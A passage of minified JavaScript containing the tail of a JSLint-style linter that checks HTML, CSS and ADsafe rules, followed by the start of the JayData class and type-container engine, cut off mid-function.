function style_list(){while(next_token.id!=='</'&&next_token.id!=='(end)'){style_pattern();xmode='styleproperty';if(next_token.id===';'){semicolon();}else{advance('{');substyle();xmode='style';advance('}');}}}
function styles(){var i;while(next_token.id==='@'){i=peek();advance('@');if(next_token.identifier){switch(next_token.value){case'import':advance();if(!css_url()){warn('expected_a_b',next_token,'url',next_token.value);advance();}
semicolon();break;case'media':advance();for(;;){if(!next_token.identifier||css_media[next_token.value]===true){stop('expected_media_a');}
advance();if(next_token.id!==','){break;}
comma();}
advance('{');style_list();advance('}');break;default:warn('expected_at_a');}}else{warn('expected_at_a');}}
style_list();}
function do_begin(n){if(n!=='html'&&!option.fragment){if(n==='div'&&option.adsafe){stop('adsafe_fragment');}else{stop('expected_a_b',token,'html',n);}}
if(option.adsafe){if(n==='html'){stop('adsafe_html',token);}
if(option.fragment){if(n!=='div'){stop('adsafe_div',token);}}else{stop('adsafe_fragment',token);}}
option.browser=true;}
function do_attribute(a,v){var u,x;if(a==='id'){u=typeof v==='string'?v.toUpperCase():'';if(ids[u]===true){warn('duplicate_a',next_token,v);}
if(!/^[A-Za-z][A-Za-z0-9._:\-]*$/.test(v)){warn('bad_id_a',next_token,v);}else if(option.adsafe){if(adsafe_id){if(v.slice(0,adsafe_id.length)!==adsafe_id){warn('adsafe_prefix_a',next_token,adsafe_id);}else if(!/^[A-Z]+_[A-Z]+$/.test(v)){warn('adsafe_bad_id');}}else{adsafe_id=v;if(!/^[A-Z]+_$/.test(v)){warn('adsafe_bad_id');}}}
x=v.search(dx);if(x>=0){warn('unexpected_char_a_b',token,v.charAt(x),a);}
ids[u]=true;}else if(a==='class'||a==='type'||a==='name'){x=v.search(qx);if(x>=0){warn('unexpected_char_a_b',token,v.charAt(x),a);}
ids[u]=true;}else if(a==='href'||a==='background'||a==='content'||a==='data'||a.indexOf('src')>=0||a.indexOf('url')>=0){if(option.safe&&ux.test(v)){stop('bad_url',next_token,v);}
urls.push(v);}else if(a==='for'){if(option.adsafe){if(adsafe_id){if(v.slice(0,adsafe_id.length)!==adsafe_id){warn('adsafe_prefix_a',next_token,adsafe_id);}else if(!/^[A-Z]+_[A-Z]+$/.test(v)){warn('adsafe_bad_id');}}else{warn('adsafe_bad_id');}}}else if(a==='name'){if(option.adsafe&&v.indexOf('_')>=0){warn('adsafe_name_a',next_token,v);}}}
function do_tag(name,attribute){var i,tag=html_tag[name],script,x;src=false;if(!tag){stop(bundle.unrecognized_tag_a,next_token,name===name.toLowerCase()?name:name+' (capitalization error)');}
if(stack.length>0){if(name==='html'){stop('unexpected_a',token,name);}
x=tag.parent;if(x){if(x.indexOf(' '+stack[stack.length-1].name+' ')<0){stop('tag_a_in_b',token,name,x);}}else if(!option.adsafe&&!option.fragment){i=stack.length;do{if(i<=0){stop('tag_a_in_b',token,name,'body');}
i-=1;}while(stack[i].name!=='body');}}
switch(name){case'div':if(option.adsafe&&stack.length===1&&!adsafe_id){warn('adsafe_missing_id');}
break;case'script':xmode='script';advance('>');if(attribute.lang){warn('lang',token);}
if(option.adsafe&&stack.length!==1){warn('adsafe_placement',token);}
if(attribute.src){if(option.adsafe&&(!adsafe_may||!approved[attribute.src])){warn('adsafe_source',token);}
if(attribute.type){warn('type',token);}}else{step_in(next_token.from);edge();use_strict();adsafe_top=true;script=statements();if(option.adsafe){if(adsafe_went){stop('adsafe_script',token);}
if(script.length!==1||aint(script[0],'id','(')||aint(script[0].first,'id','.')||aint(script[0].first.first,'value','ADSAFE')||aint(script[0].second[0],'value',adsafe_id)){stop('adsafe_id_go');}
switch(script[0].first.second.value){case'id':if(adsafe_may||adsafe_went||script[0].second.length!==1){stop('adsafe_id',next_token);}
adsafe_may=true;break;case'go':if(adsafe_went){stop('adsafe_go');}
if(script[0].second.length!==2||aint(script[0].second[1],'id','function')||!script[0].second[1].first||script[0].second[1].first.length!==2||aint(script[0].second[1].first[0],'value','dom')||aint(script[0].second[1].first[1],'value','lib')){stop('adsafe_go',next_token);}
adsafe_went=true;break;default:stop('adsafe_id_go');}}
indent=null;}
xmode='html';advance('</');if(!next_token.identifier&&next_token.value!=='script'){warn('expected_a_b',next_token,'script',next_token.value);}
advance();xmode='outer';break;case'style':xmode='style';advance('>');styles();xmode='html';advance('</');if(!next_token.identifier&&next_token.value!=='style'){warn('expected_a_b',next_token,'style',next_token.value);}
advance();xmode='outer';break;case'input':switch(attribute.type){case'radio':case'checkbox':case'button':case'reset':case'submit':break;case'text':case'file':case'password':case'file':case'hidden':case'image':if(option.adsafe&&attribute.autocomplete!=='off'){warn('adsafe_autocomplete');}
break;default:warn('bad_type');}
break;case'applet':case'body':case'embed':case'frame':case'frameset':case'head':case'iframe':case'noembed':case'noframes':case'object':case'param':if(option.adsafe){warn('adsafe_tag',next_token,name);}
break;}}
function closetag(name){return'</'+name+'>';}
function html(){var attribute,attributes,is_empty,name,old_white=option.white,quote,tag_name,tag,wmode;xmode='html';xquote='';stack=null;for(;;){switch(next_token.value){case'<':xmode='html';advance('<');attributes={};tag_name=next_token;if(!tag_name.identifier){warn('bad_name_a',tag_name);}
name=tag_name.value;if(option.cap){name=name.toLowerCase();}
tag_name.name=name;advance();if(!stack){stack=[];do_begin(name);}
tag=html_tag[name];if(typeof tag!=='object'){stop('unrecognized_tag_a',tag_name,name);}
is_empty=tag.empty;tag_name.type=name;for(;;){if(next_token.id==='/'){advance('/');if(next_token.id!=='>'){warn('expected_a_b',next_token,'>',next_token.value);}
break;}
if(next_token.id&&next_token.id.charAt(0)==='>'){break;}
if(!next_token.identifier){if(next_token.id==='(end)'||next_token.id==='(error)'){warn('expected_a_b',next_token,'>',next_token.value);}
warn('bad_name_a');}
option.white=false;spaces();attribute=next_token.value;option.white=old_white;advance();if(!option.cap&&attribute!==attribute.toLowerCase()){warn('attribute_case_a',token);}
attribute=attribute.toLowerCase();xquote='';if(Object.prototype.hasOwnProperty.call(attributes,attribute)){warn('duplicate_a',token,attribute);}
if(attribute.slice(0,2)==='on'){if(!option.on){warn('html_handlers');}
xmode='scriptstring';advance('=');quote=next_token.id;if(quote!=='"'&&quote!=='\''){stop('expected_a_b',next_token,'"',next_token.value);}
xquote=quote;wmode=option.white;option.white=true;advance(quote);use_strict();statements();option.white=wmode;if(next_token.id!==quote){stop('expected_a_b',next_token,quote,next_token.value);}
xmode='html';xquote='';advance(quote);tag=false;}else if(attribute==='style'){xmode='scriptstring';advance('=');quote=next_token.id;if(quote!=='"'&&quote!=='\''){stop('expected_a_b',next_token,'"',next_token.value);}
xmode='styleproperty';xquote=quote;advance(quote);substyle();xmode='html';xquote='';advance(quote);tag=false;}else{if(next_token.id==='='){advance('=');tag=next_token.value;if(!next_token.identifier&&next_token.id!=='"'&&next_token.id!=='\''&&next_token.id!=='(string)'&&next_token.id!=='(string)'&&next_token.id!=='(color)'){warn('expected_attribute_value_a',token,attribute);}
advance();}else{tag=true;}}
attributes[attribute]=tag;do_attribute(attribute,tag);}
do_tag(name,attributes);if(!is_empty){stack.push(tag_name);}
xmode='outer';advance('>');break;case'</':xmode='html';advance('</');if(!next_token.identifier){warn('bad_name_a');}
name=next_token.value;if(option.cap){name=name.toLowerCase();}
advance();if(!stack){stop('unexpected_a',next_token,closetag(name));}
tag_name=stack.pop();if(!tag_name){stop('unexpected_a',next_token,closetag(name));}
if(tag_name.name!==name){stop('expected_a_b',next_token,closetag(tag_name.name),closetag(name));}
if(next_token.id!=='>'){stop('expected_a_b',next_token,'>',next_token.value);}
xmode='outer';advance('>');break;case'<!':if(option.safe){warn('adsafe_a');}
xmode='html';for(;;){advance();if(next_token.id==='>'||next_token.id==='(end)'){break;}
if(next_token.value.indexOf('--')>=0){stop('unexpected_a',next_token,'--');}
if(next_token.value.indexOf('<')>=0){stop('unexpected_a',next_token,'<');}
if(next_token.value.indexOf('>')>=0){stop('unexpected_a',next_token,'>');}}
xmode='outer';advance('>');break;case'(end)':return;default:if(next_token.id==='(end)'){stop('missing_a',next_token,'</'+stack[stack.length-1].value+'>');}else{advance();}}
if(stack&&stack.length===0&&(option.adsafe||!option.fragment||next_token.id==='(end)')){break;}}
if(next_token.id!=='(end)'){stop('unexpected_a');}}
itself=function(the_source,the_option){var i,predef,tree;JAYLINT.comments=[];JAYLINT.errors=[];JAYLINT.tree='';begin=older_token=prev_token=token=next_token=Object.create(syntax['(begin)']);predefined={};add_to_predefined(standard);if(the_option){option=Object.create(the_option);predef=option.predef;if(predef){if(Array.isArray(predef)){for(i=0;i<predef.length;i+=1){predefined[predef[i]]=true;}}else if(typeof predef==='object'){add_to_predefined(predef);}}
do_safe();}else{option={};}
option.indent=+option.indent||0;option.maxerr=option.maxerr||50;adsafe_id='';adsafe_may=adsafe_top=adsafe_went=false;approved={};if(option.approved){for(i=0;i<option.approved.length;i+=1){approved[option.approved[i]]=option.approved[i];}}else{approved.test='test';}
tab='';for(i=0;i<option.indent;i+=1){tab+=' ';}
global_scope=scope={};global_funct=funct={'(scope)':scope,'(breakage)':0,'(loopage)':0};functions=[funct];comments_off=false;ids={};in_block=false;indent=null;json_mode=false;lookahead=[];member={};node_js=false;properties=null;prereg=true;src=false;stack=null;strict_mode=false;urls=[];var_mode=null;warnings=0;xmode='';lex.init(the_source);assume();try{advance();if(next_token.id==='(number)'){stop('unexpected_a');}else if(next_token.value.charAt(0)==='<'){html();if(option.adsafe&&!adsafe_went){warn('adsafe_go',this);}}else{switch(next_token.id){case'{':case'[':json_mode=true;json_value();break;case'@':case'*':case'#':case'.':case':':xmode='style';advance();if(token.id!=='@'||!next_token.identifier||next_token.value!=='charset'||token.line!==1||token.from!==1){stop('css');}
advance();if(next_token.id!=='(string)'&&next_token.value!=='UTF-8'){stop('css');}
advance();semicolon();styles();break;default:if(option.adsafe&&option.fragment){stop('expected_a_b',next_token,'<div>',next_token.value);}
step_in(1);if(next_token.id===';'&&!node_js){semicolon();}
adsafe_top=true;tree=statements();begin.first=tree;JAYLINT.tree=begin;if(option.adsafe&&(tree.length!==1||aint(tree[0],'id','(')||aint(tree[0].first,'id','.')||aint(tree[0].first.first,'value','ADSAFE')||aint(tree[0].first.second,'value','lib')||tree[0].second.length!==2||tree[0].second[0].id!=='(string)'||aint(tree[0].second[1],'id','function'))){stop('adsafe_lib');}
if(tree.disrupt){warn('weird_program',prev_token);}}}
indent=null;advance('(end)');}catch(e){if(e){JAYLINT.errors.push({reason:e.message,line:e.line||next_token.line,character:e.character||next_token.from},null);}}
return JAYLINT.errors.length===0;};itself.data=function(){var data={functions:[]},function_data,globals,i,j,kind,members=[],name,the_function,undef=[],unused=[];if(itself.errors.length){data.errors=itself.errors;}
if(json_mode){data.json=true;}
if(urls.length>0){data.urls=urls;}
globals=Object.keys(global_scope).filter(function(value){return value.charAt(0)!=='('?value:undefined;});if(globals.length>0){data.globals=globals;}
for(i=1;i<functions.length;i+=1){the_function=functions[i];function_data={};for(j=0;j<functionicity.length;j+=1){function_data[functionicity[j]]=[];}
for(name in the_function){if(Object.prototype.hasOwnProperty.call(the_function,name)){if(name.charAt(0)!=='('){kind=the_function[name];if(kind==='unction'||kind==='unparam'){kind='unused';}
if(Array.isArray(function_data[kind])){function_data[kind].push(name);if(kind==='unused'){unused.push({name:name,line:the_function['(line)'],'function':the_function['(name)']});}else if(kind==='undef'){undef.push({name:name,line:the_function['(line)'],'function':the_function['(name)']});}}}}}
for(j=0;j<functionicity.length;j+=1){if(function_data[functionicity[j]].length===0){delete function_data[functionicity[j]];}}
function_data.name=the_function['(name)'];function_data.param=the_function['(params)'];function_data.line=the_function['(line)'];function_data['(complexity)']=the_function['(complexity)'];data.functions.push(function_data);}
if(unused.length>0){data.unused=unused;}
if(undef.length>0){data.undef=undef;}
members=[];for(name in member){if(typeof member[name]==='number'){data.member=member;break;}}
return data;};itself.report=function(errors_only){var data=itself.data(),err,evidence,i,j,key,keys,length,mem='',name,names,output=[],snippets,the_function,warning;function detail(h,value){var comma_needed,singularity;if(Array.isArray(value)){output.push('<div><i>'+h+'</i> ');value=value.sort().forEach(function(item){if(item!==singularity){singularity=item;output.push((comma_needed?', ':'')+singularity);comma_needed=true;}});output.push('</div>');}else if(value){output.push('<div><i>'+h+'</i> '+value+'</div>');}}
if(data.errors||data.unused||data.undef){err=true;output.push('<div id=errors><i>Error:</i>');if(data.errors){for(i=0;i<data.errors.length;i+=1){warning=data.errors[i];if(warning){evidence=warning.evidence||'';output.push('<p>Problem'+(isFinite(warning.line)?' at line '+
warning.line+' character '+warning.character:'')+': '+warning.reason.entityify()+'</p><p class=evidence>'+
(evidence&&(evidence.length>80?evidence.slice(0,77)+'...':evidence).entityify())+'</p>');}}}
if(data.undef){snippets=[];for(i=0;i<data.undef.length;i+=1){snippets[i]='<code><u>'+data.undef[i].name+'</u></code>&nbsp;<i>'+
data.undef[i].line+' </i> <small>'+
data.undef[i]['function']+'</small>';}
output.push('<p><i>Undefined variable:</i> '+snippets.join(', ')+'</p>');}
if(data.unused){snippets=[];for(i=0;i<data.unused.length;i+=1){snippets[i]='<code><u>'+data.unused[i].name+'</u></code>&nbsp;<i>'+
data.unused[i].line+' </i> <small>'+
data.unused[i]['function']+'</small>';}
output.push('<p><i>Unused variable:</i> '+snippets.join(', ')+'</p>');}
if(data.json){output.push('<p>JSON: bad.</p>');}
output.push('</div>');}
if(!errors_only){output.push('<br><div id=functions>');if(data.urls){detail("URLs<br>",data.urls,'<br>');}
if(xmode==='style'){output.push('<p>CSS.</p>');}else if(data.json&&!err){output.push('<p>JSON: good.</p>');}else if(data.globals){output.push('<div><i>Global</i> '+
data.globals.sort().join(', ')+'</div>');}else{output.push('<div><i>No new global variables introduced.</i></div>');}
for(i=0;i<data.functions.length;i+=1){the_function=data.functions[i];names=[];if(the_function.param){for(j=0;j<the_function.param.length;j+=1){names[j]=the_function.param[j].value;}}
output.push('<br><div class=function><i>'+the_function.line+'</i> '+the_function.name.entityify()+'('+names.join(', ')+')</div>');detail('<big><b>Undefined</b></big>',the_function.undef);detail('<big><b>Unused</b></big>',the_function.unused);detail('Closure',the_function.closure);detail('Variable',the_function['var']);detail('Exception',the_function.exception);detail('Outer',the_function.outer);detail('Global',the_function.global);detail('Label',the_function.label);detail('Complexity',the_function['(complexity)']);}
if(data.member){keys=Object.keys(data.member);if(keys.length){keys=keys.sort();mem='<br><pre id=properties>/*properties ';length=13;for(i=0;i<keys.length;i+=1){key=keys[i];name=ix.test(key)?key:'\''+key.entityify().replace(nx,sanitize)+'\'';if(length+name.length>72){output.push(mem+'<br>');mem='    ';length=1;}
length+=name.length+2;if(data.member[key]===1){name='<i>'+name+'</i>';}
if(i<keys.length-1){name+=', ';}
mem+=name;}
output.push(mem+'<br>*/</pre>');}
output.push('</div>');}}
return output.join('');};itself.jslint=itself;itself.edition='2012-05-01';return itself;}());(function init($data,global){function il(msg){if(typeof intellisense!=='undefined'){if(!intellisense.i){intellisense.i=0;}
intellisense.i=intellisense.i+1;intellisense.logMessage(msg+":"+intellisense.i);}}
function MemberDefinition(memberDefinitionData,definedClass){this.kind=MemberTypes.property;Object.defineProperty(this,'definedBy',{value:definedClass,enumerable:false,configurable:false,writable:false});if(memberDefinitionData){if(typeof memberDefinitionData==='function'||typeof memberDefinitionData.asFunction==='function'){this.method=memberDefinitionData;this.kind=MemberTypes.method;}else{this.enumerable=true;this.configurable=true;if(typeof memberDefinitionData==="number"){this.value=memberDefinitionData;this.dataType="integer";}else if(typeof memberDefinitionData==="string"){this.value=memberDefinitionData;this.dataType=typeof memberDefinitionData;}else{for(var item in memberDefinitionData){if(memberDefinitionData.hasOwnProperty(item)){this[item]=memberDefinitionData[item];}}}}
if(this.type!==undefined){this.dataType=this.dataType||this.type;}else{this.type=this.dataType;}}}
MemberDefinition.prototype.createPropertyDescriptor=function(classFunction,value){var pd=this;var result={enumerable:this.enumerable==undefined?true:this.enumerable,configurable:this.configurable==undefined?true:this.configurable};if(this.set&&this.get){result.set=this.set;result.get=this.get;}else if("value"in this||value){result.value=value||this.value;result.writable=true;}
else{result.set=function(value){this.storeProperty(pd,value);};result.get=function(){return this.retrieveProperty(pd);};}
return result;};MemberDefinition.prototype.createStorePropertyDescriptor=function(value){var pd=this;return{enumerable:false,writable:true,configurable:pd.configurable,value:value};};MemberDefinition.prototype.createGetMethod=function(){var pd=this;return{enumerable:false,writable:false,configurable:false,value:function(callback,tran){return this.getProperty(pd,callback,tran);}};};MemberDefinition.prototype.createSetMethod=function(){var pd=this;return{enumerable:false,writable:false,configurable:false,value:function(value,callback,tran){return this.setProperty(pd,value,callback,tran);}};};MemberDefinition.translateDefinition=function(memDef,name,classFunction){var holder=classFunction;var memberDefinition;if(memDef.type&&Container.isTypeRegistered(memDef.type)){holder=Container.resolveType(memDef.type);if(typeof holder.translateDefinition==='function'){memberDefinition=holder.translateDefinition.apply(holder,arguments);memberDefinition.name=memberDefinition.name||name;}else{holder=classFunction;}}
if(!(memberDefinition instanceof MemberDefinition)){memberDefinition=new MemberDefinition(memberDefinition||memDef,holder);memberDefinition.name=name;}
var t=memberDefinition.type;if("string"===typeof t){if("@"===t[0]){memberDefinition.type=t.substr(1);memberDefinition.dataType=t.substr(1);}else{classFunction.container.resolveType(t,function(type){memberDefinition.type=type;memberDefinition.dataType=type;});}}
if(memberDefinition.elementType){t=memberDefinition.elementType;if("string"===typeof t){if("@"===t[0]){memberDefinition.elementType=t.substr(1);}else{classFunction.container.resolveType(t,function(type){memberDefinition.elementType=type;});}}}
return memberDefinition;};MemberDefinition.prototype.toJSON=function(){var alma={};for(var name in this){if(name!=='defineBy'&&name!=='storageModel'){alma[name]=this[name];}}
return alma;}
$data.MemberDefinition=window["MemberDefinition"]=MemberDefinition;var memberDefinitionPrefix='$';function MemberDefinitionCollection(){};MemberDefinitionCollection.prototype={clearCache:function(){this.arrayCache=undefined;this.pubMapPropsCache=undefined;this.keyPropsCache=undefined;this.propByTypeCache=undefined;this.pubMapMethodsCache=undefined;this.pubMapPropNamesCache=undefined;},asArray:function(){if(!this.arrayCache){this.arrayCache=[];for(var i in this){if(i.indexOf(memberDefinitionPrefix)===0)
this.arrayCache.push(this[i]);}}
return this.arrayCache;},getPublicMappedProperties:function(){if(!this.pubMapPropsCache){this.pubMapPropsCache=[];for(var i in this){if(i.indexOf(memberDefinitionPrefix)===0&&this[i].kind=='property'&&!this[i].notMapped&&this[i].enumerable)
this.pubMapPropsCache.push(this[i]);}}
return this.pubMapPropsCache;},getPublicMappedPropertyNames:function(){if(!this.pubMapPropNamesCache){this.pubMapPropNamesCache=[];for(var i in this){if(i.indexOf(memberDefinitionPrefix)===0&&this[i].kind=='property'&&!this[i].notMapped&&this[i].enumerable)
this.pubMapPropNamesCache.push(this[i].name);}}
return this.pubMapPropNamesCache;},getKeyProperties:function(){if(!this.keyPropsCache){this.keyPropsCache=[];for(var i in this){if(i.indexOf(memberDefinitionPrefix)===0&&this[i].kind=='property'&&this[i].key)
this.keyPropsCache.push(this[i]);}}
return this.keyPropsCache;},getPublicMappedMethods:function(){if(!this.pubMapMethodsCache){this.pubMapMethodsCache=[];for(var i in this){if(i.indexOf(memberDefinitionPrefix)===0&&this[i].kind=='method'&&this[i].method)
this.pubMapMethodsCache.push(this[i]);}}
return this.pubMapMethodsCache;},getPropertyByType:function(type){if(!this.propByTypeCache){this.propByTypeCache=[];for(var i in this){if(i.indexOf(memberDefinitionPrefix)===0&&this[i].dataType==type)
this.propByTypeCache.push(this[i]);}}
return this.propByTypeCache;},getMember:function(name){return this[memberDefinitionPrefix+name];},setMember:function(value){this[memberDefinitionPrefix+value.name]=value;}};MemberDefinitionCollection.prototype.constructor=MemberDefinitionCollection;$data.MemberDefinitionCollection=window["MemberDefinitionCollection"]=MemberDefinitionCollection;function ClassEngineBase(){this.classNames={};}
function MemberTypes(){}
MemberTypes.__enum=true;MemberTypes.method="method";MemberTypes.property="property";MemberTypes.navProperty="navProperty";MemberTypes.complexProperty="complexProperty";MemberTypes.field="field";$data.MemberTypes=MemberTypes;ClassEngineBase.prototype={define:function(className,baseClass,container,instanceDefinition,classDefinition){return this.defineEx(className,[{type:baseClass}],container,instanceDefinition,classDefinition);},defineEx:function(className,baseClasses,container,instanceDefinition,classDefinition){container=container||$data.Container;if(baseClasses.length==0){baseClasses.push({type:$data.Base});}else if(baseClasses.length>0&&!baseClasses[0].type){baseClasses[0].type=$data.Base;}
for(var i=0,l=baseClasses.length;i<l;i++){if(typeof baseClasses[i]==='function')
baseClasses[i]={type:baseClasses[i]};}
var providedCtor=instanceDefinition?instanceDefinition.constructor:undefined;var classNameParts=className.split('.');var shortClassName=classNameParts.splice(classNameParts.length-1,1)[0];var root=container===$data.Container?window:container;for(var i=0;i<classNameParts.length;i++){var part=classNameParts[i];if(!root[part]){var ns={};ns.__namespace=true;root[part]=ns;}
root=root[part];}
var classFunction=null;classFunction=this.classFunctionBuilder(shortClassName,baseClasses,classDefinition,instanceDefinition);classFunction.fullName=className;classFunction.namespace=classNameParts.join('.');classFunction.name=shortClassName;classFunction.container=container;classFunction.container.registerType(className,classFunction);this.buildType(classFunction,baseClasses,instanceDefinition,classDefinition);if(typeof intellisense!=='undefined'){if(instanceDefinition&&instanceDefinition.constructor){intellisense.annotate(classFunction,instanceDefinition.constructor);}}
root[shortClassName]=this.classNames[className]=classFunction;var baseCount=classFunction.baseTypes.length;for(var i=0;i<baseCount;i++){var b=classFunction.baseTypes[i];if("inheritedTypeProcessor"in b){b.inheritedTypeProcessor(classFunction);}}
return classFunction;},classFunctionBuilder:function(name,base,classDefinition,instanceDefinition){var body=this.bodyBuilder(base,classDefinition,instanceDefinition);return new Function('base','classDefinition','instanceDefinition','name','return function '+name+' (){ '+
body+' \n}; ')(base,classDefinition,instanceDefinition,name);},bodyBuilder:function(bases,classDefinition,instanceDefinition){var mixin='';var body='';var propagation='';for(var i=0,l=bases.length;i<l;i++){var base=bases[i];var index=i;if(index==0){if(base&&base.type&&base.type!==$data.Base&&base.type.fullName){body+='    var baseArguments = $data.typeSystem.createCtorParams(arguments, base['+index+'].params, this); \n';body+='    '+base.type.fullName+'.apply(this, baseArguments); \n';}}else{if(base&&base.type&&base.propagateTo){propagation+='    '+(!propagation?'var ':''+'')+'propagationArguments = $data.typeSystem.createCtorParams(arguments, base['+index+'].params, this); \n';propagation+='    this["'+base.propagateTo+'"] =  Object.create('+base.type.fullName+'.prototype); \n'+'    '+base.type.fullName+'.apply(this["'+base.propagateTo+'"], propagationArguments); \n';}
else if(base&&base.type&&base.type.memberDefinitions&&base.type.memberDefinitions.$constructor&&!base.propagateTo){mixin+='    '+base.type.fullName+'.memberDefinitions.$constructor.method.apply(this); \n';}}}
if(instanceDefinition&&instanceDefinition.constructor!=Object)
body+="    instanceDefinition.constructor.apply(this, arguments); \n";return'\n    //mixins \n'+mixin+'\n    //construction \n'+body+'\n    //propagations \n'+propagation;},buildType:function(classFunction,baseClasses,instanceDefinition,classDefinition){var baseClass=baseClasses[0].type;classFunction.inheritsFrom=baseClass;if(baseClass){classFunction.prototype=Object.create(baseClass.prototype);classFunction.memberDefinitions=Object.create(baseClass.memberDefinitions||new MemberDefinitionCollection());classFunction.memberDefinitions.clearCache();var staticDefs=baseClass.staticDefinitions;if(staticDefs){staticDefs=staticDefs.asArray();if(staticDefs){for(var i=0;i<staticDefs.length;i++){this.buildMember(classFunction,staticDefs[i],undefined,'staticDefinitions');}}}
classFunction.baseTypes=baseClass.baseTypes?[].concat(baseClass.baseTypes):[];for(var i=0;i<baseClasses.length;i++){classFunction.baseTypes.push(baseClasses[i].type);}
if(!classFunction.isAssignableTo){Object.defineProperty(classFunction,"isAssignableTo",{value:function(type){return this===type||this.baseTypes.indexOf(type)>=0;},writable:false,enumerable:false,configurable:false});}}
if(classDefinition){this.buildStaticMembers(classFunction,classDefinition);if(classDefinition.constructor)
classFunction.classConstructor=classDefinition.constructor;}
if(instanceDefinition){this.buildInstanceMembers(classFunction,instanceDefinition);}
var mixins=[].concat(baseClasses);mixins.shift();if(Object.keys(mixins).length>0)
this.buildInstanceMixins(classFunction,mixins);classFunction.__class=true;classFunction.prototype.constructor=classFunction;Object.defineProperty(classFunction.prototype,"getType",{value:function(){return classFunction;},writable:false,enumerable:false,configurable:false});},addMethod:function(holder,name,method,propagation){if(!propagation||(typeof intellisense!=='undefined')){holder[name]=method;}else{holder[name]=function(){return method.apply(this[propagation],arguments);};}},addProperty:function(holder,name,propertyDescriptor,propagation){if(propagation){propertyDescriptor.configurable=true;if(propertyDescriptor.get){var origGet=propertyDescriptor.get;propertyDescriptor.get=function(){if(!this[propagation])
Guard.raise(new Exception("not inicialized"));return origGet.apply(this[propagation],arguments);};}
if(propertyDescriptor.set){var origSet=propertyDescriptor.set;propertyDescriptor.set=function(){if(!this[propagation])
Guard.raise(new Exception("not inicialized"));origSet.apply(this[propagation],arguments);};}}
Object.defineProperty(holder,name,propertyDescriptor);},addField:function(holder,name,field){Guard.raise("not implemented");},buildMethod:function(classFunction,memberDefinition,propagation){var holder=memberDefinition.classMember?classFunction:classFunction.prototype;this.addMethod(holder,memberDefinition.name,memberDefinition.method,propagation);},buildProperty:function(classFunction,memberDefinition,propagation){var holder=memberDefinition.classMember?classFunction:classFunction.prototype;var pd=memberDefinition.createPropertyDescriptor(classFunction);this.addProperty(holder,memberDefinition.name,pd,propagation);if(!memberDefinition.classMember&&classFunction.__setPropertyfunctions==true&&memberDefinition.withoutGetSetMethod!==true&&!('get_'+memberDefinition.name in holder||'set_'+memberDefinition.name in holder)){var pdGetMethod=memberDefinition.createGetMethod();this.addProperty(holder,'get_'+memberDefinition.name,pdGetMethod,propagation);var pdSetMethod=memberDefinition.createSetMethod();this.addProperty(holder,'set_'+memberDefinition.name,pdSetMethod,propagation);}},buildMember:function(classFunction,memberDefinition,propagation,memberCollectionName){memberCollectionName=memberCollectionName||'memberDefinitions';classFunction[memberCollectionName]=classFunction[memberCollectionName]||new MemberDefinitionCollection();classFunction[memberCollectionName].setMember(memberDefinition);switch(memberDefinition.kind){case MemberTypes.method:this.buildMethod(classFunction,memberDefinition,propagation);break;case MemberTypes.navProperty:case MemberTypes.complexProperty:case MemberTypes.property:this.buildProperty(classFunction,memberDefinition,propagation);break;default:Guard.raise("Unknown member type: "+memberDefinition.kind+","+memberDefinition.name);}},buildStaticMembers:function(classFunction,memberListDefinition){var t=this;for(var item in memberListDefinition){if(memberListDefinition.hasOwnProperty(item)){var memberDefinition=MemberDefinition.translateDefinition(memberListDefinition[item],item,classFunction);memberDefinition.classMember=true;t.buildMember(classFunction,memberDefinition,undefined,'staticDefinitions');}}},buildInstanceMembers:function(classFunction,memberListDefinition){var t=this;for(var item in memberListDefinition){if(memberListDefinition.hasOwnProperty(item)){var memberDefinition=MemberDefinition.translateDefinition(memberListDefinition[item],item,classFunction);t.buildMember(classFunction,memberDefinition,undefined,'memberDefinitions');}}},copyMembers:function(sourceType,targetType){function il(msg){if(typeof intellisense==='undefined'){return;}
intellisense.logMessage(msg);}
Object.keys(sourceType.prototype).forEach(function(item,i,src){if(item!=='constructor'&&item!=='toString'){il("copying item:"+item);targetType.prototype[item]=sourceType[item];}});},buildInstanceMixins:function(classFunction,mixinList){classFunction.mixins=classFunction.mixins||[];classFunction.propagations=classFunction.propagations||[];for(var i=0;i<mixinList.length;i++){var item=mixinList[i];if(item.propagateTo){this.buildInstancePropagation(classFunction,item);classFunction.propagations.push(item);classFunction.propagations[item.type.name]=true;}else{this.buildInstanceMixin(classFunction,item);classFunction.mixins.push(item);classFunction.mixins[item.type.name]=true;}};},buildInstanceMixin:function(classFunction,typeObj){var memberDefs=typeObj.type.memberDefinitions.asArray();for(var i=0,l=memberDefs.length;i<l;i++){var itemName=memberDefs[i].name;if(itemName!=='constructor'&&!classFunction.memberDefinitions.getMember(itemName)){this.buildMember(classFunction,memberDefs[i]);}}
if(typeObj.type.staticDefinitions){var staticDefs=typeObj.type.staticDefinitions.asArray();for(var i=0,l=staticDefs.length;i<l;i++){var itemName=staticDefs[i].name;if(itemName!=='constructor'&&!classFunction.memberDefinitions.getMember(itemName)){this.buildMember(classFunction,staticDefs[i],undefined,'staticDefinitions');}}}},buildInstancePropagation:function(classFunction,typeObj){var memberDefs=typeObj.type.memberDefinitions.asArray();for(var i=0,l=memberDefs.length;i<l;i++){var itemName=memberDefs[i].name;if(itemName!=='constructor'&&!classFunction.memberDefinitions.getMember(itemName)){this.buildMember(classFunction,memberDefs[i],typeObj.propagateTo);}}}};$data.Class=Class=new ClassEngineBase();global=window;function ContainerCtor(parentContainer){var parent=parentContainer;if(parent){parent.addChildContainer(this);}
var classNames={};var consolidatedClassNames=[];var classTypes=[];this.classNames=classNames;this.consolidatedClassNames=consolidatedClassNames;this.classTypes=classTypes;var mappedTo=[];this.mappedTo=mappedTo;var self=this;this["holder"]=null;var IoC=function(type,parameters){var t=self.resolveType(type);var inst=Object.create(t.prototype);t.apply(inst,parameters);return inst;};var pendingResolutions={};this.pendingResolutions=pendingResolutions;function addPendingResolution(name,onResolved){pendingResolutions[name]=pendingResolutions[name]||[];pendingResolutions[name].push(onResolved);}
this.addChildContainer=function(container){}
